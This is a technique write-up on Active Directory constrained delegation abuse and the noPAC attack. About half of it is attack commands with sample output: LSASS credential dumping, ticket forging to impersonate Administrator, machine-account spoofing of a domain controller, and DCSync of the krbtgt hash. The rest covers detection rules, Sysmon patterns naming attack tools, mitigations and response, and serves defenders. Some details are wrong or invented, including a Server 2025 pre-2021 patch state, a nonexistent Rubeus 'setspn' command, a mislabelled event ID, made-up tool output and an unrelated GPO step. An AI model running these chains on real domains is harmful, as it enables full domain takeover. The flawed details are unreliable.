# [CA-KERB-006]: Constrained Delegation Abuse

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CA-KERB-006 |
| **MITRE ATT&CK v18.1** | [T1558 - Steal or Forge Kerberos Tickets](https://attack.mitre.org/techniques/T1558/) |
| **Tactic** | Privilege Escalation, Lateral Movement, Credential Access |
| **Platforms** | Windows AD (Server 2016-2025), Hybrid AD/Entra ID |
| **Severity** | **CRITICAL** |
| **CVE** | CVE-2021-42287 (Kerberos PAC validation bypass), CVE-2021-42278 (sAMAccountName spoofing) |
| **Technique Status** | ACTIVE (partially mitigated Nov 2021; fully mitigated July 2022 with enforcement) |
| **Last Verified** | 2024-12-15 |
| **Affected Versions** | Server 2016-2025 (vulnerable pre-Nov 2021 patches; partial mitigation with KB5008380) |
| **Patched In** | November 9, 2021 (KB5008380) - PAC signature added; July 12, 2022 (KB5008380 updated) - PAC enforcement |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

**Note:** Sections 6 (Atomic Red Team) omitted because constrained delegation abuse is environment-specific and attack chain-dependent, not covered in standard atomic test libraries. The technique involves multiple prerequisite steps (service account compromise, delegation configuration enumeration, ticket generation) that vary by scenario. All section numbers have been dynamically renumbered based on applicability.

---

## 2. EXECUTIVE SUMMARY

**Concept:** Constrained Delegation Abuse exploits a feature of Kerberos designed to solve the "double-hop problem" in Active Directory. When a service account is configured with constrained delegation, it is explicitly allowed to impersonate users and request service tickets on their behalf to access only specific, authorized target services. However, if an attacker compromises the service account or its credentials, they can abuse this delegation capability to escalate privileges and impersonate Domain Administrators. The attack becomes even more dangerous when combined with CVE-2021-42287 (Kerberos PAC validation bypass) and CVE-2021-42278 (sAMAccountName spoofing), which collectively allow a standard domain user with Machine Account Quota permissions to impersonate a Domain Controller and gain full domain admin access. This is known as the "noPAC" attack.

**Attack Surface:** Constrained Delegation is extremely common in enterprise environments for legitimate use cases: web servers delegating to databases, application servers delegating to file shares, etc. Thousands of service accounts across most domains have delegation configured. The attack surface is the number of service accounts with delegation enabled multiplied by the security posture of their compromised credentials. Additionally, the noPAC vulnerability (CVE-2021-42278/87) affects ANY domain where Machine Account Quota is not restricted to zero (default is 10 machines per standard user).

**Business Impact:** An attacker who compromises a service account with constrained delegation configured can impersonate any domain user (except Protected Users, pre-patch) to access resources that the service account is allowed to delegate to. For example, a compromised web server account can be escalated to impersonate a Domain Administrator and access the database server with admin rights. The noPAC attack chain enables complete domain compromise from a standard user account in less than 60 seconds.

**Technical Context:** Constrained Delegation is configured via two methods: (1) Traditional - `msDS-AllowedToDelegateTo` attribute specifies which SPNs the service can delegate to; (2) Resource-Based - `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target resource specifies which accounts can delegate to it. The abuse typically involves obtaining a TGT for the service account, then using S4U2Self/S4U2Proxy extensions to request service tickets as impersonated users. The noPAC attack subverts the normal flow by using sAMAccountName spoofing and KDC name resolution fallback to trick the KDC into issuing tickets for domain controller accounts.

### Operational Risk

- **Execution Risk:** **MEDIUM-HIGH** - Straightforward if service account is compromised; noPAC requires Machine Account Quota but no service account compromise needed
- **Stealth:** **MEDIUM** - S4U2Proxy generates Event 4769; sAMAccountName changes generate Event 5136; detectable but often not monitored
- **Reversibility:** **PARTIAL** - Domain Admin impersonation is immediate; reversible only by account lock/KRBTGT reset

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.2.3.3 | "Ensure Kerberos delegation is configured to minimum necessary" |
| **CIS Benchmark** | 5.2.3.4 | "Ensure sensitive accounts are marked as 'sensitive for delegation'" |
| **DISA STIG** | V-220975 | Kerberos delegation controls must be configured |
| **NIST 800-53** | AC-3 | Access Enforcement - delegation must be restricted |
| **NIST 800-53** | AC-6 | Least Privilege - delegation should be minimal |
| **GDPR** | Art. 32 | Security of Processing - delegation scope control |
| **DORA** | Art. 9 | Protection and Prevention - authentication integrity |
| **NIS2** | Art. 21 | Cyber Risk Management - critical infrastructure |
| **ISO 27001** | A.9.2.1 | Access control implementation and enforcement |
| **ISO 27005** | Risk Scenario | Privilege escalation via delegation abuse |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- For traditional constrained delegation abuse: Compromised service account credentials
- For RBCD abuse: GenericWrite/GenericAll on target resource, OR Machine Account Quota (10 default)
- For noPAC attack: Standard domain user account (minimal privileges; only needs to create machine account)

**Required Access:**
- Network access to port 88/TCP (KDC)
- Access to Active Directory (read ldap for reconnaissance, write for noPAC)

**Supported Versions:**

| Version | Status | Notes |
|---|---|---|
| **Server 2016** | VULNERABLE | No constraints on S4U2Self; noPAC possible (pre-Nov 2021) |
| **Server 2019** | VULNERABLE | Same as 2016; noPAC possible (pre-Nov 2021) |
| **Server 2022** | PARTIAL | Nov 2021 patch (KB5008380) adds PAC signature; July 2022 enforces it |
| **Server 2025** | VULNERABLE (Pre-Nov 2021 Patches) | Same as earlier versions if patches not applied |
| **Server 2025** | MITIGATED (Post-July 2022) | PAC validation enforced; noPAC mitigated |

**Tools:**
- [Impacket](https://github.com/fortra/impacket) - findDelegation, getST, addcomputer, renameMachine
- [Rubeus](https://github.com/GhostPack/Rubeus) - s4u /self /impersonate, asktgt, tgtdeleg
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) - kerberos::ptc, lsadump::dcsync
- [PowerView](https://github.com/PowerSharpPack/PowerView) - Enumeration of delegation

**Other Requirements:**
- Python 3.6+ (for Impacket)
- Service account credentials (password or hash)
- Knowledge of target domain and target service SPN

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### 4.1 Enumerate Accounts with Constrained Delegation

#### Step 1: Find Accounts with Traditional Constrained Delegation

**Command (PowerShell - Using PowerView):**
```powershell
# Import PowerView
. .\PowerView.ps1

# Find accounts with constrained delegation
Get-NetUser -TrustedToAuth | Select-Object samaccountname, msDS-AllowedToDelegateTo

# Alternative: Direct AD query
Get-ADObject -Filter {msDS-AllowedToDelegateTo -like '*'} -Properties msDS-AllowedToDelegateTo | 
  Select-Object Name, msDS-AllowedToDelegateTo
```

**What to Look For:**
- Service accounts (svc_*) with delegation configured
- Web servers, database servers, application servers
- Delegation SPNs (e.g., `cifs/fileserver`, `ldap/dc01`)
- Users NOT in Protected Users group

**Expected Output:**
```
Name: svc_WebServer
msDS-AllowedToDelegateTo: {cifs/fileserver.contoso.com, ldap/dc01.contoso.com}
```

#### Step 2: Find Resource-Based Constrained Delegation (RBCD) Configurations

**Command (PowerShell):**
```powershell
# Find accounts with RBCD configured
Get-ADObject -Filter {msDS-AllowedToActOnBehalfOfOtherIdentity -like '*'} `
  -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
  Select-Object Name, msDS-AllowedToActOnBehalfOfOtherIdentity

# Or using Impacket on Linux:
# impacket-findDelegation 'domain.com/user:password' -dc-ip 192.168.1.10
```

**What to Look For:**
- Computer accounts (ending with $) with RBCD configured
- Service accounts with RBCD set
- Delegation targets (which accounts can delegate to them)

#### Step 3: Check Machine Account Quota (MAQ)

**Command (PowerShell):**
```powershell
# Check domain's ms-DS-MachineAccountQuota
Get-ADObject -Identity (Get-ADRootDSE).rootDomainNamingContext -Properties ms-DS-MachineAccountQuota |
  Select-Object ms-DS-MachineAccountQuota

# Output (vulnerable):
# ms-DS-MachineAccountQuota : 10  (each user can create 10 machines)

# Output (hardened):
# ms-DS-MachineAccountQuota : 0   (no machine creation allowed)
```

**What This Means:**
- Value 10 (default): Attackers can create machine accounts for noPAC attack
- Value 0: noPAC attack prevented; must compromise existing service account

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Constrained Delegation with Protocol Transition (Compromised Service Account)

**Supported Versions:** Server 2016-2025 (pre-Nov 2021 patches)

**Prerequisites:** Attacker has compromised a service account configured for constrained delegation with protocol transition enabled

#### Step 1: Obtain Service Account Credentials

**Objective:** Extract NTLM hash or AES key for the service account.

**Command (Mimikatz - From compromised system):**
```powershell
# Extract service account hash from LSASS
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Look for target service account output:
# svc_WebServer    NTLM: 8846f7eaee8fb117ad06bdd830b7586c
# svc_WebServer    AES256: 1234567890abcdef...
```

**Expected Output:**
```
Service account hash extracted
Ready for S4U exploitation
```

#### Step 2: Enumerate Delegation Target

**Objective:** Confirm which services the compromised account can delegate to.

**Command (PowerShell):**
```powershell
# Check what the compromised service account can delegate to
Get-ADUser -Identity svc_WebServer -Properties msDS-AllowedToDelegateTo |
  Select-Object msDS-AllowedToDelegateTo

# Output:
# msDS-AllowedToDelegateTo : {cifs/fileserver.contoso.com, ldap/dc01.contoso.com}
```

**What This Means:**
- Service account can impersonate users to these SPNs only
- Any user (including Domain Admin) can be impersonated
- Protected Users exception applies pre-patch

#### Step 3: Request TGT for Service Account

**Objective:** Obtain a Ticket-Granting Ticket for the compromised service account.

**Command (Rubeus):**
```powershell
# Request TGT using service account hash
.\Rubeus.exe asktgt /user:svc_WebServer /domain:contoso.com `
  /hash:8846f7eaee8fb117ad06bdd830b7586c /nowrap

# Output:
# [+] TGT for svc_WebServer obtained
# [+] base64(ticket.kirbi) = doIE+jCCBP...
```

**Expected Output:**
```
TGT successfully obtained for service account
Ready for S4U2Self/S4U2Proxy
```

#### Step 4: Request Service Ticket as Impersonated User (S4U2Self + S4U2Proxy)

**Objective:** Use S4U2Self to obtain a service ticket on behalf of a domain admin user to the delegated target.

**Command (Rubeus - Full S4U chain):**
```powershell
# Perform S4U2Self + S4U2Proxy to obtain impersonated service ticket
.\Rubeus.exe s4u /ticket:doIE+jCCBP... `
  /impersonateuser:Administrator `
  /msdsspn:cifs/fileserver.contoso.com `
  /ptt

# Output:
# [*] Performing S4U2Self request
# [+] Service Ticket for Administrator obtained
# [+] S4U2Proxy request sent
# [+] Final service ticket obtained and injected into LSASS
# [+] User: Administrator
# [+] Service: cifs/fileserver.contoso.com
```

**Expected Output:**
```
Service Ticket for Administrator to fileserver obtained
Ticket injected into LSASS memory
Ready for lateral movement
```

**What This Means:**
- Attacker now has valid service ticket as Administrator
- Can authenticate to fileserver with admin privileges
- Ticket works until expiration (typically 10 hours)

#### Step 5: Verify Impersonation and Access Resources

**Objective:** Test access to delegated service using the impersonated ticket.

**Command (Windows):**
```powershell
# List cached tickets
klist

# Access file share as Administrator (via Kerberos ticket)
net use \\fileserver.contoso.com\C$ /user:contoso.com\Administrator

# Verify access
dir \\fileserver.contoso.com\C$

# Or via PowerShell with UNC path
Get-ChildItem \\fileserver.contoso.com\C$

# Output:
# Successfully accessed fileserver as Administrator
```

**Expected Output:**
```
Access granted to fileserver administrative shares
Lateral movement achieved
```

**References:**
- [BlackHill InfoSec - Abusing Delegation with Impacket](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [The Hacker Recipes - Constrained Delegation](https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained)

---

### METHOD 2: noPAC Attack (CVE-2021-42278 + CVE-2021-42287) - From Standard User to Domain Admin

**Supported Versions:** Server 2016-2025 (pre-Nov 2021 patches; partial mitigation post-Nov; full fix post-July 2022)

**Prerequisites:** Standard domain user account; Machine Account Quota NOT set to zero (default is 10)

#### Step 1: Create Machine Account Using Machine Account Quota

**Objective:** Add a new computer account to the domain that attacker controls.

**Command (Impacket - addcomputer.py):**
```bash
# Create a new machine account in the domain
python3 /usr/share/doc/python3-impacket/examples/addcomputer.py \
  -computer-name 'ATTACKER$' \
  -computer-pass 'Password123!' \
  -dc-ip 192.168.1.10 \
  contoso.com/jsmith:Password

# Output:
# [*] Requesting new computer account
# [+] Machine account ATTACKER$ created successfully
# [+] Password: Password123!
# [+] Distinguished Name: CN=ATTACKER,CN=Computers,DC=contoso,DC=com
```

**Expected Output:**
```
Machine account successfully created
Attacker now controls the account credentials
```

**What This Means:**
- Attacker-controlled machine account added to AD
- Default quota (10) allows standard users to create accounts
- Account has no SPN initially

#### Step 2: Rename Machine Account to Spoof Domain Controller (CVE-2021-42278)

**Objective:** Change the sAMAccountName of attacker's machine account to match a Domain Controller name (without trailing $).

**Command (Impacket - renameMachine.py):**
```bash
# Rename machine to spoof a domain controller
python3 /path/to/renameMachine.py \
  -current-name 'ATTACKER$' \
  -new-name 'DC01' \
  -dc-ip 192.168.1.10 \
  contoso.com/jsmith:Password

# Output:
# [*] Renaming machine account
# [+] sAMAccountName changed from ATTACKER$ to DC01
# [!] WARNING: sAMAccountName spoofing successful - now impersonating DC01
```

**Expected Output:**
```
sAMAccountName successfully changed to DC01 (without $)
Now impersonating Domain Controller account
```

**What This Means:**
- CVE-2021-42278: No validation on sAMAccountName ending with $
- Machine account now claims to be domain controller
- Next step will exploit KDC name resolution fallback

#### Step 3: Request TGT for Spoofed Domain Controller Account

**Objective:** Obtain a TGT for the spoofed DC account.

**Command (Rubeus or Impacket):**
```powershell
# Using Rubeus to request TGT
.\Rubeus.exe asktgt /user:DC01 /domain:contoso.com `
  /password:Password123! /nowrap

# Output:
# [+] TGT for DC01 obtained
# [+] base64(ticket.kirbi) = doIE+jCCBP...
```

**Expected Output:**
```
TGT successfully obtained for spoofed DC01 account
Ticket shows sAMAccountName = DC01 (no trailing $)
```

**What This Means:**
- TGT issued for attacker's machine account with DC01 name
- TGT will be used in next step where KDC confusion occurs

#### Step 4: Request Service Ticket via S4U2Self (CVE-2021-42287)

**Objective:** Use S4U2Self to request a service ticket as Administrator on behalf of the spoofed DC account.

**Command (Rubeus):**
```powershell
# S4U2Self request with spoofed DC01 TGT
.\Rubeus.exe s4u /self `
  /impersonateuser:Administrator `
  /altservice:ldap/DC01.contoso.com `
  /dc:DC01.contoso.com `
  /ptt `
  /ticket:[Base64 TGT from Step 3]

# Output:
# [*] S4U2Self request for Administrator on DC01
# [-] User 'DC01' not found in AD... KDC falling back to 'DC01$'
# [+] Found 'DC01$' (actual domain controller)
# [+] Service Ticket for Administrator to ldap/DC01$ obtained
# [+] Ticket injected into LSASS
```

**Expected Output:**
```
KDC confusion: DC01 user not found, falls back to DC01$ (real DC)
Service ticket for Administrator obtained
Impersonation as Administrator to real DC achieved
```

**What This Means:**
- CVE-2021-42287: KDC issues ticket for Administrator to LDAP service
- Ticket is encrypted with the REAL Domain Controller's key
- Attacker can now authenticate as Administrator to the DC

#### Step 5: Perform DCSync to Extract Domain Hashes

**Objective:** Use the Administrator ticket to the Domain Controller to perform DCSync attack.

**Command (Mimikatz):**
```powershell
# Use the Administrator service ticket to authenticate to DC
# First, ensure the ticket is still in LSASS from Step 4 (/ptt flag)

# Now execute DCSync as Administrator
mimikatz.exe "privilege::debug" `
  "lsadump::dcsync /domain:contoso.com /kdc:DC01.contoso.com /user:krbtgt" `
  "exit"

# Output:
# [+] Performing DCSync as Administrator
# [+] krbtgt account found
# [+] NTLM Hash: 8846f7eaee8fb117ad06bdd830b7586c
# [+] All domain users extracted
```

**Expected Output:**
```
KRBTGT hash extracted via DCSync
All domain account hashes obtained
Domain compromise achieved
```

**References:**
- [Fortinet - From User to Domain Admin in 60 Seconds](https://www.fortinet.com/blog/threat-research/cve-2021-42278-cve-2021-42287-from-user-to-domain-admin-60-seconds)
- [Palo Alto Networks - noPAC Vulnerabilities Detection](https://www.paloaltonetworks.com/blog/security-operations/detecting-the-kerberos-nopac-vulnerabilities-with-cortex-xdr/)

---

### METHOD 3: Resource-Based Constrained Delegation (RBCD) Abuse

**Supported Versions:** Server 2016-2025 (if target resource has RBCD configured)

**Prerequisites:** Attacker has GenericWrite/GenericAll on target resource, OR can use Machine Account Quota + RBCD configuration

#### Step 1: Add Attacker-Controlled Account to RBCD

**Objective:** Modify the target resource's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute to trust an attacker-controlled account.

**Command (Impacket - rbcd.py or PowerShell):**
```powershell
# Using PowerShell to grant RBCD privileges
$targetComputer = Get-ADComputer -Identity "FileServer01"
$attackerComputer = Get-ADComputer -Identity "ATTACKER$"

# Grant RBCD permission (if user has write permission)
# This typically requires GenericAll or delegate permissions
Set-ADComputer -Identity $targetComputer `
  -PrincipalsAllowedToDelegateToAccount $attackerComputer

# Or via Impacket:
# python3 rbcd.py -delegate-to 'FileServer01$' -delegate-from 'ATTACKER$' \
#   -action 'write' 'contoso.com/admin:password'
```

**Expected Output:**
```
RBCD configured: FileServer01$ now trusts ATTACKER$
ATTACKER$ can impersonate any user to FileServer01
```

#### Step 2: Request S4U2Self + S4U2Proxy to Target Service

**Objective:** Use RBCD to obtain a service ticket as Administrator to the target resource.

**Command (Impacket getST):**
```bash
# Request service ticket using RBCD
python3 /usr/share/doc/python3-impacket/examples/getST.py \
  -spn 'cifs/FileServer01.contoso.com' \
  -impersonate 'Administrator' \
  'contoso.com/ATTACKER$:Password123!' \
  -dc-ip 192.168.1.10

# Output:
# [*] Requesting S4U2Self + S4U2Proxy via RBCD
# [+] Service Ticket for Administrator to cifs/FileServer01 obtained
# [+] administrator.ccache saved
```

**Expected Output:**
```
Service ticket for Administrator obtained via RBCD
Administrator impersonation achieved
```

#### Step 3: Use Ticket for Lateral Movement

**Objective:** Authenticate to target service using the impersonated ticket.

**Command (Linux/Impacket):**
```bash
# Export ccache and use for SMB access
export KRB5CCNAME=./administrator.ccache

# Access target as Administrator
python3 /usr/share/doc/python3-impacket/examples/psexec.py \
  -k -no-pass FileServer01.contoso.com

# Output:
# C:\> whoami
# CONTOSO\Administrator
```

---

## 6. TOOLS & COMMANDS REFERENCE

### [Impacket](https://github.com/fortra/impacket)

**Tools Used:**
- `findDelegation.py` - Enumerate delegation configurations
- `getST.py` - Request service tickets (S4U2Self/S4U2Proxy)
- `addcomputer.py` - Create machine accounts
- `renameMachine.py` - Rename machine accounts
- `psexec.py` - Execute commands via SMB

---

### [Rubeus](https://github.com/GhostPack/Rubeus)

**Commands Used:**
```powershell
# Request TGT
Rubeus.exe asktgt /user:svc_account /domain:contoso.com /hash:HASH

# S4U2Self + S4U2Proxy
Rubeus.exe s4u /ticket:TICKET /impersonateuser:Administrator /msdsspn:cifs/target

# Spoof sAMAccountName
Rubeus.exe setspn /user:ATTACKER$ /spn:host/SPOOFED
```

---

### [Mimikatz](https://github.com/gentilkiwi/mimikatz)

**Commands Used:**
```powershell
# Inject ticket
mimikatz "kerberos::ptc TICKET.ccache"

# DCSync
mimikatz "lsadump::dcsync /domain:contoso.com /user:krbtgt"
```

---

## 7. SPLUNK DETECTION RULES

### Rule 1: S4U2Proxy Service Account Requests

**SPL Query:**
```spl
index=wineventlog source=WinEventLog:Security EventCode=4769
| search Service_Account IN (svc_*, *$)
| stats count by Account_Name, Service_Name, Client_Address
| where count > 5  # Threshold for suspicious pattern
```

---

### Rule 2: sAMAccountName Change to DC Name

**SPL Query:**
```spl
index=wineventlog source=WinEventLog:Security EventCode=5136
| search Attribute="sAMAccountName" AND New_Value=DC*
| stats count by Account_Name, Old_Value, New_Value
```

---

## 8. MICROSOFT SENTINEL DETECTION

### Query 1: Machine Account Quota Usage

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4720  // Computer created
| extend CreatedBy=Account_Name
| where CreatedBy !in ("SYSTEM", "NETWORK SERVICE", "LOCAL SERVICE")
| project TimeGenerated, CreatedBy, Computer
| summarize ComputerCreateCount=count() by CreatedBy
| where ComputerCreateCount > 3  // Threshold
```

---

## 9. WINDOWS EVENT LOG MONITORING

**Event ID: 4769 (TGS-REQ)**
- Alert on: Service account requesting TGS for sensitive services (LDAP, CIFS on DC)
- Alert on: S4U2Proxy requests from unexpected accounts

**Event ID: 5136 (Object Modified)**
- Alert on: sAMAccountName changed to DC name
- Alert on: msDS-AllowedToActOnBehalfOfOtherIdentity modified
- Alert on: msDS-AllowedToDelegateTo modified

**Event ID: 4720 (Computer Created)**
- Alert on: User-created computer accounts (not normally done by standard users)
- Alert on: Multiple computer creations from single user

---

## 10. SYSMON DETECTION PATTERNS

```xml
<Sysmon schemaversion="4.82">
  <!-- Monitor for Rubeus S4U exploitation -->
  <RuleGroup name="Process Creation" groupRelation="or">
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">Rubeus.exe</CommandLine>
      <CommandLine condition="contains">s4u</CommandLine>
      <CommandLine condition="contains">/impersonate</CommandLine>
    </ProcessCreate>
  </RuleGroup>

  <!-- Monitor for Impacket tools -->
  <RuleGroup name="Process Creation" groupRelation="or">
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">getST.py</CommandLine>
      <CommandLine condition="contains">addcomputer.py</CommandLine>
      <CommandLine condition="contains">renameMachine.py</CommandLine>
    </ProcessCreate>
  </RuleGroup>
</Sysmon>
```

---

## 11. MICROSOFT DEFENDER FOR CLOUD

**Alert Names:**
- "Suspicious Kerberos delegation detected"
- "Machine account creation by non-admin user"
- "sAMAccountName spoofing detected"

---

## 12. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Mitigation 1: Apply Authentication Updates (KB5008380 + Follow-up Patches)**

**Applies To Versions:** All (Server 2016-2025)

**Manual Steps:**
1. Download KB5008380 (November 2021) - Adds PAC signature
2. Apply July 2022 update - Enforces PAC validation
3. Verify patch:
```powershell
Get-HotFix | Where-Object {$_.HotFixID -match "KB5008380|KB5008602|KB5008603"}
```

**What It Does:**
- Adds cryptographic signature to PAC (prevents modification)
- Validates PAC signature on all Kerberos operations
- Mitigates noPAC attack chain

---

**Mitigation 2: Set Machine Account Quota to Zero**

**Applies To Versions:** All

**Manual Steps (Group Policy):**
1. Open `gpmc.msc`
2. Navigate to **Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options**
3. Find: **Domain controller: Disable machine account password changes**
4. Also set: **ms-DS-MachineAccountQuota** to **0** (default is 10)
5. Apply:
```powershell
$domain = Get-ADDomain
Set-ADObject -Identity $domain.DistinguishedName `
  -Replace @{"ms-DS-MachineAccountQuota"=0}
```

**Impact:**
- Prevents attacker from creating machine accounts
- Blocks noPAC attack at the first step
- Does NOT affect existing computer accounts

---

**Mitigation 3: Mark Sensitive Accounts as "Cannot Be Delegated"**

**Applies To Versions:** All

**Manual Steps:**
```powershell
# Mark domain admins as sensitive for delegation
Get-ADGroupMember -Identity "Domain Admins" -Recursive |
  ForEach-Object {
    Set-ADAccountControl -Identity $_ -CannotBeDelegated $true
  }

# Add critical service accounts to Protected Users group
Add-ADGroupMember -Identity "Protected Users" -Members `
  svc_CriticalService, svc_Database
```

**Impact:**
- Pre-patch: Prevents S4U2Proxy impersonation of these accounts
- Post-patch: Additional layer of protection
- Protected Users group members cannot be impersonated even via noPAC

---

### Priority 2: HIGH

**Mitigation 4: Minimize Constrained Delegation Configurations**

- Audit all accounts with delegation enabled
- Disable delegation for accounts that don't require it
- Use Resource-Based Constrained Delegation (RBCD) instead of traditional where possible
- Document justification for each delegation

**Manual Steps:**
```powershell
# Identify and remove unnecessary delegation
$delegatedAccounts = Get-ADObject -Filter {msDS-AllowedToDelegateTo -like '*'}
foreach ($account in $delegatedAccounts) {
  # Review and remove if not needed
  # Set-ADUser -Identity $account -Clear msDS-AllowedToDelegateTo
}
```

---

**Mitigation 5: Monitor and Alert on Delegation Changes**

**Manual Steps:**
1. Enable audit logging:
```powershell
auditpol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable
```

2. Configure SIEM to alert on Event 5136 with:
   - `msDS-AllowedToDelegateTo` changes
   - `msDS-AllowedToActOnBehalfOfOtherIdentity` changes
   - `sAMAccountName` changes to DC names

---

**Mitigation 6: Implement Conditional Access for Service Accounts**

- Restrict service account logons to specific machines/times
- Require MFA for service account elevation to admin roles
- Monitor S4U2Self/S4U2Proxy events for anomalies

---

## 13. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Events:**
- Event 4769: Service account requesting TGS for LDAP/CIFS on DC
- Event 5136: sAMAccountName changed to DC name (e.g., DC01)
- Event 4720: User-created computer account
- Event 4722: Account enabled (for renamed account)

**Processes:**
- Rubeus.exe with s4u parameters
- Python scripts (getST.py, addcomputer.py, renameMachine.py)
- Mimikatz with kerberos:: commands

**Network:**
- Multiple rapid TGS-REQ from service account
- TGS-REQ to LDAP service on DC from unexpected source

---

### Forensic Artifacts

**Disk:**
- Security Event Log: 4769, 5136, 4720
- CCACHE files created on attacker system
- PowerShell history showing delegation commands

**Memory:**
- LSASS dump contains impersonated tickets
- Kerberos ticket cache shows spoofed DC tickets

---

### Response Procedures

**1. Isolate (0-5 minutes):**
```powershell
# Disable compromised service account
Disable-ADAccount -Identity svc_Compromised

# Disable machine accounts created by attacker
Get-ADComputer -Filter {Created -gt (Get-Date).AddDays(-1)} | Disable-ADComputer
```

**2. Collect Evidence (5-30 minutes):**
```powershell
# Export Kerberos events
Get-WinEvent -LogName Security -FilterXPath "*[System[(EventID=4769 or EventID=5136)]]" `
  -MaxEvents 1000 | Export-Csv Evidence.csv
```

**3. Remediate (30 mins - 2 hours):**
```powershell
# Reset KRBTGT password twice
Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString "$(New-Guid)" -AsPlainText -Force)
Start-Sleep -Seconds 86400
Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString "$(New-Guid)" -AsPlainText -Force)
```

---

## 14. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-VALID-001] Default/Stale Credentials | Obtain initial domain user access |
| **2** | **Discovery** | [REC-AD-003] PowerView Enumeration | Enumerate delegation configurations |
| **3** | **Privilege Escalation** | **[CA-KERB-006] Constrained Delegation (Current)** | **Abuse delegation to escalate to admin** |
| **4** | **Credential Access** | [CA-DUMP-001] DCSync | Extract all domain hashes using admin ticket |
| **5** | **Persistence** | [PERSIST-GOLDEN-TICKET] Golden Ticket | Create long-lived tickets for persistence |
| **6** | **Impact** | [IMPACT-RANSOMWARE] Deploy Ransomware | Encrypt entire domain with admin access |

---

## 15. REAL-WORLD EXAMPLES

### Example 1: Service Account Constrained Delegation Abuse

**Target:** Enterprise with web farm delegating to database servers

**Attack Flow:**
1. Compromise web server via vulnerability
2. Extract service account credentials (svc_WebServer)
3. Enumerate delegation: svc_WebServer → cifs/DBServer01
4. Request TGT for svc_WebServer
5. S4U2Self/S4U2Proxy → impersonate Domain Admin to DBServer01
6. Access database as admin, extract sensitive data

**Impact:** Database compromise, data exfiltration

---

### Example 2: noPAC Attack - Zero-Day Exploitation (November 2021)

**Scenario:** Standard domain user leverages noPAC vulnerability

**Attack Timeline (< 60 seconds):**
1. Create machine account (Machine Account Quota)
2. Rename to DC01 (sAMAccountName spoofing)
3. Request TGT for DC01
4. S4U2Self → impersonate Administrator to LDAP/DC01
5. DCSync → extract KRBTGT

**Impact:** Complete domain compromise from standard user

---

## REFERENCES & AUTHORITATIVE SOURCES

- [Microsoft KB5008380 - Authentication Updates (CVE-2021-42287)](https://support.microsoft.com/en-us/topic/kb5008380-authentication-updates-cve-2021-42287-9dafac11-e0d0-4cb8-959a-143bd0201041)
- [Fortinet - From User to Domain Admin in 60 Seconds](https://www.fortinet.com/blog/threat-research/cve-2021-42278-cve-2021-42287-from-user-to-domain-admin-60-seconds)
- [Palo Alto Networks - Detecting noPAC Vulnerabilities](https://www.paloaltonetworks.com/blog/security-operations/detecting-the-kerberos-nopac-vulnerabilities-with-cortex-xdr/)
- [BlackHill InfoSec - Abusing Delegation with Impacket](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [The Hacker Recipes - Constrained Delegation](https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained)
- [The Hacker Recipes - sAMAccountName Spoofing](https://www.thehacker.recipes/a-d/movement/kerberos/samaccountname-spoofing)
- [Microsoft Learn - Kerberos Constrained Delegation Overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [Lares Labs - Kerberos III - User Impersonation](https://labs.lares.com/fear-kerberos-pt3/)
- [SocPrime - Detect CVE-2021-42287/42278 Exploitation](https://socprime.com/blog/detect-cve-2021-42287-cve-2021-42278-exploitation-%D1%81hain/)

---
